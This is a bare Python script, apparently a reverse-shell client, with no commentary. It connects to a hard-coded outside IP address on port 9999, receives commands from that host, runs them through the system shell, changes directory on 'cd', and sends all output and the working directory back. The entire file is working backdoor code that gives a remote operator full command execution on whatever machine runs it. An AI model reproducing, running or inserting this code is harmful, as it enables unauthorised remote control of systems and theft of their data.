import socket
import os
import subprocess


s = socket.socket()
host = '142.93.215.28'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        try:
            output_str = output_bytes.decode("utf-8")
        except UnicodeDecodeError:
            output_str = output_bytes.decode("latin-1")

        s.send(str.encode(output_str + str(os.getcwd()) + '> '))

        print(output_str)